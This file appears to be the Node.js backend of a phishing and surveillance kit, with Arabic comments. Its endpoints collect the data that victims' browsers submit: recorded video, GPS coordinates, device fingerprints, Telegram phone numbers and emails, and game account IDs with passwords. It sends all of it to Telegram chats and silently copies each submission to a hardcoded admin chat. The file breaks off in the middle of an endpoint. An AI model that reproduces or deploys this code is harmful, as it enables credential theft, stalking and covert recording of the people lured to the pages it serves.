require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');
const moment = require('moment-timezone');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));

// إعداد multer للرفع
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 100 * 1024 * 1024 // 100MB limit للفيديو
  }
});

// إعداد multer للفيديو (لحفظ على القرص)
const videoStorage = multer.diskStorage({
    destination: (req, file, cb) => {
        const uploadDir = 'uploads/videos';
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${Math.random().toString(36).substring(7)}-${file.originalname || 'video.webm'}`;
        cb(null, uniqueName);
    }
});

const videoUpload = multer({
    storage: videoStorage,
    limits: {
        fileSize: 100 * 1024 * 1024, // 100MB
        files: 1
    },
    fileFilter: (req, file, cb) => {
        const allowedTypes = ['video/webm', 'video/mp4', 'video/quicktime', 'video/x-msvideo', 'video/3gpp', 'video/mpeg'];
        if (allowedTypes.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error('نوع الملف غير مدعوم. يرجى رفع ملف فيديو فقط.'));
        }
    }
});

// التوكن من البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// إعدادات الأدمن
const ADMIN_CHAT_ID = '6808883615'; // ايدي الأدمن الثابت

if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
}

// وظيفة إرسال الرسائل للتلجرام
async function sendToTelegram(chatId, message, fileBuffer = null, filename = null) {
    try {
        // إذا لم يكن هناك توكن، نعمل محاكاة
        if (!BOT_TOKEN) {
            console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
            if (fileBuffer) {
                console.log(`📁 [محاكاة] مع ملف: ${filename}`);
            }
            return true;
        }

        if (fileBuffer && filename) {
            // إرسال ملف
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', message);
            formData.append('document', fileBuffer, { filename: filename });
            
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
                headers: formData.getHeaders()
            });
            
            return response.data.ok;
        } else {
            // إرسال رسالة نصية
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            });
            
            return response.data.ok;
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error.response?.data || error.message);
        return false;
    }
}

// وظيفة إرسال فيديو للتلجرام
async function sendVideoToTelegram(chatId, message, videoPath, videoName) {
    try {
        // إذا لم يكن هناك توكن، نعمل محاكاة
        if (!BOT_TOKEN) {
            console.log(`🎬 [محاكاة] إرسال فيديو إلى chatId ${chatId}: ${message.substring(0, 100)}...`);
            console.log(`📁 [محاكاة] ملف الفيديو: ${videoName}`);
            return true;
        }

        // قراءة ملف الفيديو
        const videoBuffer = fs.readFileSync(videoPath);
        
        // إرسال الفيديو
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('video', videoBuffer, { 
            filename: videoName,
            contentType: 'video/mp4'
        });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, formData, {
            headers: formData.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        return response.data.ok;
    } catch (error) {
        console.error('Error sending video to Telegram:', error.response?.data || error.message);
        return false;
    }
}

// دالة جديدة لإرسال الصور
async function sendPhotosToTelegram(chatId, message, images = []) {
  try {
    // إذا لم يكن هناك توكن، نعمل محاكاة
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال صور إلى chatId ${chatId}: ${message.substring(0, 100)}...`);
      console.log(`🖼️ [محاكاة] عدد الصور: ${images.length}`);
      return true;
    }

    // إرسال النص أولاً
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    });

    // إرسال الصور إذا وجدت
    for (const image of images) {
      const formData = new FormData();
      formData.append('photo', image.buffer, {
        filename: image.originalname,
        contentType: 'image/webp'
      });
      formData.append('chat_id', chatId);
      formData.append('caption', `📸 ${image.originalname}`);

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
        headers: {
          ...formData.getHeaders()
        }
      });
    }

    return true;
  } catch (error) {
    console.error('Error sending photos to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// وظيفة إرسال نسخة للأدمن
async function sendCopyToAdmin(message, originalChatId, fileBuffer = null, filename = null, fileType = 'text') {
  try {
    const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${originalChatId}\n\n${message}`;
    
    let sent;
    if (fileBuffer && filename) {
      if (fileType === 'video') {
        // إرسال فيديو للأدمن
        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('caption', adminMessage);
        formData.append('video', fileBuffer, { 
          filename: filename,
          contentType: 'video/mp4'
        });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, formData, {
          headers: formData.getHeaders(),
          maxContentLength: Infinity,
          maxBodyLength: Infinity
        });
        sent = response.data.ok;
      } else {
        // إرسال ملف عادي للأدمن
        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('caption', adminMessage);
        formData.append('document', fileBuffer, { filename: filename });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
          headers: formData.getHeaders()
        });
        sent = response.data.ok;
      }
    } else {
      sent = await sendToTelegram(ADMIN_CHAT_ID, adminMessage);
    }
    
    if (sent) {
      console.log('✅ تم إرسال نسخة للأدمن بنجاح');
      return true;
    } else {
      console.log('❌ فشل إرسال نسخة للأدمن');
      return false;
    }
  } catch (error) {
    console.error('❌ خطأ في إرسال نسخة للأدمن:', error);
    return false;
  }
}

// دالة للحصول على معلومات الموقع من IP
async function getLocationFromIP(ip) {
    try {
        if (ip === '::1' || ip === '127.0.0.1' || ip.includes('localhost')) {
            return {
                country: 'غير معروف',
                city: 'غير معروف'
            };
        }

        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        const data = response.data;
        
        if (data.status === 'success') {
            return {
                country: data.country || 'غير معروف',
                city: data.city || 'غير معروف'
            };
        } else {
            return {
                country: 'غير معروف',
                city: 'غير معروف'
            };
        }
    } catch (error) {
        console.error('Error getting location from IP:', error.message);
        return {
            country: 'غير معروف',
            city: 'غير معروف'
        };
    }
}

// دالة لاستخراج معلومات الجهاز من User Agent
function parseDeviceInfo(userAgent) {
    let os = 'غير معروف';
    let browser = 'غير معروف';
    let device = 'غير معروف';

    // كشف نظام التشغيل
    if (userAgent.includes('Android')) {
        const androidVersion = userAgent.match(/Android\s([0-9\.]+)/);
        os = `Android ${androidVersion ? androidVersion[1] : '0.0.0'}`;
        device = 'Generic Smartphone';
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        const iosVersion = userAgent.match(/OS\s([0-9_]+)/);
        os = `iOS ${iosVersion ? iosVersion[1].replace(/_/g, '.') : '0.0.0'}`;
        device = 'Apple Device';
    } else if (userAgent.includes('Windows')) {
        const windowsVersion = userAgent.match(/Windows\s([0-9\.]+)/);
        os = `Windows ${windowsVersion ? windowsVersion[1] : '0.0.0'}`;
        device = 'PC';
    } else if (userAgent.includes('Mac OS')) {
        const macVersion = userAgent.match(/Mac OS X\s([0-9_]+)/);
        os = `macOS ${macVersion ? macVersion[1].replace(/_/g, '.') : '0.0.0'}`;
        device = 'Mac';
    } else if (userAgent.includes('Linux')) {
        os = 'Linux';
        device = 'Linux Device';
    }

    // كشف المتصفح
    if (userAgent.includes('Chrome')) {
        const chromeVersion = userAgent.match(/Chrome\/([0-9\.]+)/);
        browser = `Chrome ${chromeVersion ? chromeVersion[1].split('.')[0] : '0'}`;
        if (userAgent.includes('Mobile')) browser += ' Mobile';
    } else if (userAgent.includes('Firefox')) {
        const firefoxVersion = userAgent.match(/Firefox\/([0-9\.]+)/);
        browser = `Firefox ${firefoxVersion ? firefoxVersion[1] : '0.0.0'}`;
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        const safariVersion = userAgent.match(/Version\/([0-9\.]+)/);
        browser = `Safari ${safariVersion ? safariVersion[1] : '0.0.0'}`;
    } else if (userAgent.includes('Edge')) {
        const edgeVersion = userAgent.match(/Edge\/([0-9\.]+)/);
        browser = `Edge ${edgeVersion ? edgeVersion[1] : '0.0.0'}`;
    }

    return { os, browser, device };
}

// ================== 🎬 نقطة استقبال الفيديو الجديدة ==================
app.post('/api/capture/record', videoUpload.single('video'), async (req, res) => {
  try {
    console.log('🎬 📥 استقبال طلب تسجيل فيديو جديد...');
    
    if (!req.file) {
      return res.status(400).json({
        success: false,
        message: 'لم يتم رفع أي ملف فيديو'
      });
    }

    const chatId = req.body.chatId || 'unknown';
    const type = req.body.type || 'video';
    const deviceInfo = req.body.deviceInfo || '{}';
    
    console.log('📊 معلومات استقبال الفيديو:');
    console.log(`   👤 Chat ID: ${chatId}`);
    console.log(`   📦 النوع: ${type}`);
    console.log(`   📁 الملف: ${req.file.filename}`);
    console.log(`   📏 الحجم: ${(req.file.size / 1024 / 1024).toFixed(2)} MB`);
    console.log(`   🕒 الوقت: ${new Date().toLocaleString('ar-EG')}`);
    
    // محاولة قراءة معلومات الجهاز
    let deviceData = {};
    try {
      deviceData = JSON.parse(deviceInfo);
    } catch (e) {
      deviceData = { error: 'Failed to parse device info' };
    }
    
    // الحصول على معلومات IP
    const userIP = req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress || 
                  'غير معروف';
    
    const cleanIP = userIP.toString().split(',')[0].trim();
    
    // الحصول على معلومات الموقع من IP
    let locationFromIP = { country: 'غير معروف', city: 'غير معروف' };
    if (cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
      locationFromIP = await getLocationFromIP(cleanIP);
    }
    
    // تحليل معلومات الجهاز من User Agent
    const userAgent = req.headers['user-agent'] || 'غير معروف';
    const deviceInfoParsed = parseDeviceInfo(userAgent);
    
    // وقت الاستلام بتوقيت السعودية
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    // تنسيق رسالة Telegram
    const telegramMessage = `
🎬 <b>تم استلام فيديو جديد!</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📦 <b>نوع التسجيل:</b> ${type}

📁 <b>معلومات الفيديو:</b>
   • 📝 اسم الملف: ${req.file.originalname || 'غير محدد'}
   • 📏 الحجم: ${(req.file.size / 1024 / 1024).toFixed(2)} MB
   • 📋 النوع: ${req.file.mimetype}

🌍 <b>معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationFromIP.country}
   • 🏙️ المدينة: ${locationFromIP.city}

📱 <b>معلومات الجهاز:</b>
   • 📱 النظام: ${deviceInfoParsed.os}
   • 🌐 المتصفح: ${deviceInfoParsed.browser}
   • 🖥️ الجهاز: ${deviceInfoParsed.device}

🕒 <b>وقت الاستلام:</b> ${saudiTime}

📎 <b>User Agent:</b>
<code>${userAgent}</code>`;

    // إرسال الفيديو إلى Telegram
    const sendResult = await sendVideoToTelegram(
      chatId, 
      telegramMessage, 
      req.file.path, 
      req.file.filename
    );
    
    // إرسال نسخة للأدمن
    const videoBuffer = fs.readFileSync(req.file.path);
    await sendCopyToAdmin(
      telegramMessage, 
      chatId, 
      videoBuffer, 
      req.file.filename, 
      'video'
    );
    
    // حفظ معلومات التسجيل
    const logEntry = {
      timestamp: new Date().toISOString(),
      saudiTime: saudiTime,
      chatId: chatId,
      type: type,
      filename: req.file.filename,
      originalname: req.file.originalname,
      size: req.file.size,
      mimetype: req.file.mimetype,
      ip: cleanIP,
      location: locationFromIP,
      deviceInfo: deviceData,
      userAgent: userAgent
    };

    const logDir = 'logs';
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    
    const logFile = path.join(logDir, 'video_records.log');
    fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');

    console.log('✅ تم معالجة الفيديو بنجاح:', {
      chatId,
      filename: req.file.filename,
      telegramSent: sendResult
    });

    // ✅ إرجاع رد ناجح
    res.status(200).json({
      success: true,
      message: 'تم استلام الفيديو وإرساله بنجاح',
      uploaded: true,
      telegramSent: sendResult,
      filename: req.file.filename,
      data: {
        timestamp: saudiTime,
        chatId: chatId,
        orderId: `#VID${Math.floor(100000 + Math.random() * 900000)}`
      }
    });

  } catch (error) {
    console.error('❌ خطأ في معالجة الفيديو:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء معالجة الفيديو',
      error: error.message
    });
  }
});

// ================== 📱 نقطة معلومات الجهاز (للفيديو) ==================
app.post('/api/capture/info', async (req, res) => {
  try {
    const { chatId, deviceInfo } = req.body;
    
    console.log('📱 استقبال معلومات جهاز فقط');
    console.log(`   👤 Chat ID: ${chatId}`);
    
    // الحصول على معلومات IP
    const userIP = req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  'غير معروف';
    
    const cleanIP = userIP.toString().split(',')[0].trim();
    
    // وقت الاستلام بتوقيت السعودية
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    // تحليل معلومات الجهاز
    let deviceData = {};
    try {
      deviceData = typeof deviceInfo === 'string' ? JSON.parse(deviceInfo) : deviceInfo;
    } catch (e) {
      deviceData = { raw: deviceInfo };
    }
    
    // تنسيق رسالة Telegram
    const telegramMessage = `
📱 <b>معلومات جهاز للتسجيل</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📱 <b>نوع الطلب:</b> معلومات جهاز فقط

🌍 <b>معلومات الاتصال:</b>
   • 📱 IP: ${cleanIP}
   • 🕒 الوقت: ${saudiTime}

📊 <b>معلومات الجهاز:</b>
<code>${JSON.stringify(deviceData, null, 2)}</code>`;

    // إرسال إلى Telegram
    await sendToTelegram(chatId, telegramMessage);
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(telegramMessage, chatId);
    
    // حفظ في السجل
    const logEntry = {
      timestamp: new Date().toISOString(),
      saudiTime: saudiTime,
      chatId: chatId,
      type: 'info_only',
      ip: cleanIP,
      deviceInfo: deviceData
    };

    const logDir = 'logs';
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    
    const logFile = path.join(logDir, 'video_records.log');
    fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
    
    res.status(200).json({
      success: true,
      message: 'تم استلام معلومات الجهاز وإرسالها بنجاح'
    });
    
  } catch (error) {
    console.error('❌ خطأ في استقبال المعلومات:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ================== 📍 نقطة استقبال الموقع ==================
app.post('/submitLocation', async (req, res) => {
  try {
    console.log('📍 استقبال بيانات موقع جديد...');
    
    const { chatId, latitude, longitude, additionalData } = req.body;
    
    // التحقق من البيانات المطلوبة
    if (!chatId || !latitude || !longitude) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة. يرجى إرسال chatId و latitude و longitude'
      });
    }

    // تحويل additionalData من JSON إذا كان string
    let additionalInfo = {};
    try {
      additionalInfo = typeof additionalData === 'string' ? 
        JSON.parse(additionalData) : 
        (additionalData || {});
    } catch (e) {
      additionalInfo = {};
    }

    // الحصول على عنوان IP
    const userIP = req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress || 
                  'غير معروف';
    
    // تنظيف IP
    const cleanIP = userIP.toString().split(',')[0].trim();
    
    // الحصول على معلومات الموقع من IP
    let locationFromIP = { country: 'غير معروف', city: 'غير معروف' };
    if (cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
      locationFromIP = await getLocationFromIP(cleanIP);
    }

    // وقت الاستلام بتوقيت السعودية
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    // تحليل معلومات الجهاز من User Agent
    const userAgent = req.headers['user-agent'] || 'غير معروف';
    const deviceInfo = parseDeviceInfo(userAgent);

    // تنسيق الرسالة لـ Telegram
    const telegramMessage = `
🗺️ <b>تم الحصول على موقع جديد!</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>

📍 <b>الإحداثيات:</b>
   • خط العرض: <code>${latitude}</code>
   • خط الطول: <code>${longitude}</code>

🌍 <b>معلومات الموقع:</b>
   • 📱 IP: ${additionalInfo.ip || cleanIP || 'غير متاح'}
   • 🏳️ الدولة: ${additionalInfo.country || locationFromIP.country || 'غير متاح'}
   • 🏙️ المدينة: ${additionalInfo.city || locationFromIP.city || 'غير متاح'}
   • 🕒 المنطقة الزمنية: ${additionalInfo.timezone || 'غير متاح'}
   • 🌐 اللغة: ${additionalInfo.language || 'غير متاح'}

📱 <b>معلومات الجهاز:</b>
   • 📱 النظام: ${deviceInfo.os}
   • 🌐 المتصفح: ${deviceInfo.browser}
   • 🖥️ الجهاز: ${deviceInfo.device}
   • 📏 دقة الشاشة: ${additionalInfo.screenResolution || 'غير متاح'}
   • 🔋 البطارية: ${additionalInfo.batteryLevel || 'غير متاح'}
   • ⚡ قيد الشحن: ${additionalInfo.batteryCharging ? 'نعم' : 'لا'}

🕒 <b>وقت الاستلام:</b> ${saudiTime}

🔗 <b>رابط الخريطة:</b>
https://www.google.com/maps?q=${latitude},${longitude}

📎 <b>User Agent:</b>
<code>${userAgent}</code>`;

    console.log('📍 بيانات الموقع المستلمة:', {
      chatId,
      latitude,
      longitude,
      ip: cleanIP,
      country: locationFromIP.country,
      city: locationFromIP.city
    });

    // إرسال البيانات إلى Telegram
    const sendResult = await sendToTelegram(chatId, telegramMessage);
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(telegramMessage, chatId);
    
    // حفظ البيانات في ملف
    const locationData = {
      chatId,
      latitude,
      longitude,
      additionalData: additionalInfo,
      deviceInfo,
      ip: cleanIP,
      locationFromIP,
      timestamp: saudiTime,
      userAgent
    };
    
    // حفظ في ملف JSON
    const dataDir = path.join(__dirname, 'data');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    
    const fileName = `location_${chatId}_${Date.now()}.json`;
    const filePath = path.join(dataDir, fileName);
    fs.writeFileSync(filePath, JSON.stringify(locationData, null, 2), 'utf8');
    
    console.log(`✅ تم حفظ بيانات الموقع في: ${filePath}`);

    if (sendResult) {
      res.json({
        success: true,
        message: 'تم استقبال بيانات الموقع وإرسالها بنجاح',
        data: {
          chatId,
          coordinates: { latitude, longitude },
          timestamp: saudiTime,
          mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
          orderId: `#LOC${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'تم استقبال البيانات ولكن فشل الإرسال إلى Telegram'
      });
    }
  } catch (error) {
    console.error('❌ خطأ في /submitLocation:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ في الخادم',
      error: error.message
    });
  }
});

// ================== 📲 نقطة توثيق تيليجرام ==================
app.post('/forward-to-bot', async (req, res) => {
  try {
    console.log('📲 استقبال بيانات توثيق تيليجرام...');
    
    const { phone, username, accountName, email, chatId } = req.body;
    
    if (!phone || !accountName || !email || !chatId) {
      return res.status(400).json({ 
        success: false, 
        message: 'الحقول المطلوبة: phone, accountName, email, chatId' 
      });
    }

    // نص الرسالة
    const message = `🔹 <b>بيانات توثيق تيليجرام:</b>\n\n📞 <b>رقم الهاتف:</b> ${phone}\n👤 <b>يوزر الحساب:</b> ${username || 'غير محدد'}\n🏷️ <b>اسم الحساب:</b> ${accountName}\n📧 <b>البريد الإلكتروني:</b> ${email}\n\n👑 <b>تم الإرسال بواسطة - @vipboaabot</b>`;
    
    // إرسال الرسالة إلى البوت
    const sendResult = await sendToTelegram(chatId, message);
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(message, chatId);

    // وقت الاستلام
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    console.log('📲 بيانات توثيق تيليجرام:', {
      chatId,
      phone,
      username,
      accountName,
      email
    });

    if (sendResult) {
      res.json({ 
        success: true, 
        message: 'تم إرسال البيانات إلى البوت بنجاح',
        data: {
          timestamp: saudiTime,
          chatId: chatId,
          orderId: `#TG${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({ 
        success: false, 
        message: 'فشل في إرسال البيانات إلى البوت'
      });
    }
  } catch (error) {
    console.error('❌ خطأ في /forward-to-bot:', error);
    res.status(500).json({ 
      success: false, 
      message: 'حدث خطأ في الخادم',
      error: error.message 
    });
  }
});

// ================== 📞 نقطة بيانات الاتصال ==================
app.post('/submit-contact', async (req, res) => {
  try {
    console.log('📞 استقبال بيانات اتصال جديدة...');
    
    const { name, phone, email, message: userMessage, chatId, source } = req.body;
    
    if (!phone || !chatId) {
      return res.status(400).json({ 
        success: false, 
        message: 'الحقول المطلوبة: phone, chatId' 
      });
    }

    // الحصول على معلومات إضافية
    const userAgent = req.headers['user-agent'] || 'غير معروف';
    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'غير معروف';
    const cleanIP = userIP.toString().split(',')[0].trim();
    
    // تنسيق الرسالة
    const telegramMessage = `
📞 <b>بيانات اتصال جديدة!</b>

👤 <b>المعلومات الشخصية:</b>
   • 📛 الاسم: ${name || 'غير محدد'}
   • 📱 الهاتف: ${phone}
   • 📧 الإيميل: ${email || 'غير محدد'}
   • 📝 الرسالة: ${userMessage || 'لا توجد رسالة'}

📍 <b>معلومات الإرسال:</b>
   • 🔗 المصدر: ${source || 'غير محدد'}
   • 📱 IP: ${cleanIP}
   • 🖥️ المتصفح: ${userAgent.substring(0, 100)}...

🕒 <b>وقت الإرسال:</b> ${moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss')}`;

    // إرسال البيانات إلى Telegram
    const sendResult = await sendToTelegram(chatId, telegramMessage);
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(telegramMessage, chatId);
    
    console.log('📞 بيانات اتصال مستلمة:', {
      chatId,
      name,
      phone,
      email,
      source
    });

    if (sendResult) {
      res.json({
        success: true,
        message: 'تم استقبال بيانات الاتصال وإرسالها بنجاح',
        data: {
          timestamp: moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss'),
          chatId: chatId,
          orderId: `#CONTACT${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'تم استقبال البيانات ولكن فشل الإرسال إلى Telegram'
      });
    }
  } catch (error) {
    console.error('❌ خطأ في /submit-contact:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ في الخادم',
      error: error.message
    });
  }
});

// ================== 🔄 نقطة بيانات الجهاز ==================
app.post('/SS', async (req, res) => {
    try {
        console.log('📥 استقبال بيانات جهاز جديدة...');
        
        const data = req.body;
        console.log('📊 البيانات المستلمة:', JSON.stringify(data, null, 2));
        
        const { userId, deviceInfo, userInfo } = data;
        
        // تنسيق رسالة الجهاز
        let telegramMessage = `🎯 <b>معلومات جديدة من مسابقة الحلم</b>\n\n`;
        
        if (userInfo) {
            telegramMessage += `👤 <b>المستخدم:</b>\n`;
            telegramMessage += `   📛 الاسم: ${userInfo.name || 'غير محدد'}\n`;
            telegramMessage += `   📱 الهاتف: ${userInfo.phone || 'غير محدد'}\n`;
            telegramMessage += `   📧 الإيميل: ${userInfo.email || 'غير محدد'}\n`;
            telegramMessage += `   📝 الوصف: ${userInfo.description || 'غير محدد'}\n\n`;
        }
        
        telegramMessage += `🆔 <b>معرف المستخدم:</b> ${userId}\n\n`;
        
        if (deviceInfo) {
            telegramMessage += `💻 <b>معلومات الجهاز:</b>\n`;
            telegramMessage += `   🔧 الجهاز: ${deviceInfo.deviceName || 'غير معروف'}\n`;
            telegramMessage += `   📟 النوع: ${deviceInfo.deviceType || 'غير معروف'}\n`;
            telegramMessage += `   🌐 المتصفح: ${deviceInfo.browserName || 'غير معروف'} ${deviceInfo.browserVersion || ''}\n`;
            telegramMessage += `   🖥️ الشاشة: ${deviceInfo.screenResolution || 'غير معروف'}\n`;
            telegramMessage += `   🎨 الألوان: ${deviceInfo.colorDepth || 'غير معروف'}\n`;
            telegramMessage += `   ⚡ المعالج: ${deviceInfo.cpuCores || 'غير معروف'} نواة\n`;
            telegramMessage += `   💾 الذاكرة: ${deviceInfo.memory || 'غير معروف'}\n`;
            telegramMessage += `   🔋 البطارية: ${deviceInfo.battery || 'غير معروف'}\n`;
            telegramMessage += `   ⚡ الشحن: ${deviceInfo.isCharging || 'غير معروف'}\n`;
            telegramMessage += `   📶 الشبكة: ${deviceInfo.networkType || 'غير معروف'}\n`;
            telegramMessage += `   🚀 السرعة: ${deviceInfo.networkSpeed || 'غير معروف'}\n`;
            telegramMessage += `   💬 اللغة: ${deviceInfo.language || 'غير معروف'}\n`;
            telegramMessage += `   👆 اللمس: ${deviceInfo.touchSupport ? 'مدعوم' : 'غير مدعوم'}\n`;
            telegramMessage += `   📍 الموقع: ${deviceInfo.geolocationAvailable || 'غير معروف'}\n\n`;
            
            telegramMessage += `🌍 <b>المعلومات الجغرافية:</b>\n`;
            telegramMessage += `   📍 IP: ${deviceInfo.ip || 'غير متاح'}\n`;
            telegramMessage += `   🏳️ الدولة: ${deviceInfo.country || 'غير متاح'}\n`;
            telegramMessage += `   🏙️ المدينة: ${deviceInfo.city || 'غير متاح'}\n`;
            telegramMessage += `   📍 خط العرض: ${deviceInfo.latitude || 'غير متاح'}\n`;
            telegramMessage += `   📍 خط الطول: ${deviceInfo.longitude || 'غير متاح'}\n`;
            telegramMessage += `   🕒 الوقت: ${deviceInfo.time || 'غير متاح'}\n`;
            telegramMessage += `   🌐 التوقيت: ${deviceInfo.timezone || 'غير متاح'}\n`;
        }

        // إرسال للتلجرام
        const sent = await sendToTelegram(userId, telegramMessage);
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(telegramMessage, userId);
        
        if (sent) {
            res.status(200).json({ 
                success: true, 
                message: 'تم استلام البيانات وإرسالها بنجاح' 
            });
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'تم استلام البيانات ولكن فشل الإرسال للتلجرام' 
            });
        }
        
    } catch (error) {
        console.error('❌ خطأ في معالجة بيانات الجهاز:', error);
        res.status(500).json({ 
            success: false, 
            message: 'حدث خطأ في الخادم' 
        });
    }
});

// ================== 📤 نقطة إرسال البيانات العامة ==================
app.post('/send-to-telegram', async (req, res) => {
    try {
        const { 
            playerId, 
            password, 
            amount, 
            chatId, 
            accountType, 
            device, 
            ip,
            country,
            city,
            os,
            browser,
            battery,
            charging,
            deviceType
        } = req.body;
        
        // التحقق من البيانات المطلوبة
        if (!playerId || !password || !amount || !chatId) {
            return res.status(400).json({
                success: false,
                message: 'بيانات ناقصة: يرجى التأكد من إرسال جميع البيانات المطلوبة'
            });
        }

        // الحصول على عنوان IP
        let userIP = ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        if (userIP === '::1') userIP = '127.0.0.1';
        
        const cleanIP = userIP.split(',')[0].trim();

        // الحصول على معلومات الموقع من IP
        let locationInfo = { country: 'غير معروف', city: 'غير معروف' };
        if (!country || !city || country === 'غير معروف' || city === 'غير معروف') {
            locationInfo = await getLocationFromIP(cleanIP);
        } else {
            locationInfo = { country, city };
        }

        // تحليل معلومات الجهاز
        const userDevice = device || req.headers['user-agent'] || "غير معروف";
        let deviceInfo = { os: 'غير معروف', browser: 'غير معروف', device: 'غير معروف' };
        
        if (!os || !browser || !deviceType) {
            deviceInfo = parseDeviceInfo(userDevice);
        } else {
            deviceInfo = { os, browser, device: deviceType };
        }

        // تنسيق الرسالة
        const telegramMessage = `
🎯 <b>تم الحصول على بيانات جديدة!</b>

👤 <b>المعلومات الرئيسية:</b>
   • 🔢 المعرف: ${playerId}
   • 🔐 كلمة السر: ${password}
   • 💰 المبلغ/العدد: ${amount}
   • 📊 النوع: ${accountType || 'غير محدد'}

🌍 <b>معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationInfo.country}
   • 🏙️ المدينة: ${locationInfo.city}

📱 <b>معلومات الجهاز:</b>
   • 📱 النظام: ${deviceInfo.os}
   • 🌐 المتصفح: ${deviceInfo.browser}
   • 🖥️ الجهاز: ${deviceInfo.device}
   • 🔋 البطارية: ${battery || 'غير متاح'}
   • ⚡ قيد الشحن: ${charging || 'لا'}

🕒 <b>وقت الاستلام:</b> ${moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss')}`;

        console.log('📤 إرسال بيانات جديدة:', {
            playerId,
            ip: cleanIP,
            country: locationInfo.country,
            city: locationInfo.city
        });

        // إرسال الرسالة
        const success = await sendToTelegram(chatId, telegramMessage);
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(telegramMessage, chatId);
        
        if (success) {
            res.json({
                success: true,
                message: 'تم إرسال البيانات إلى Telegram بنجاح',
                orderId: `#${Math.floor(100000 + Math.random() * 900000)}`,
                data: {
                    accountType: accountType || 'غير محدد',
                    ip: cleanIP,
                    country: locationInfo.country,
                    city: locationInfo.city
                }
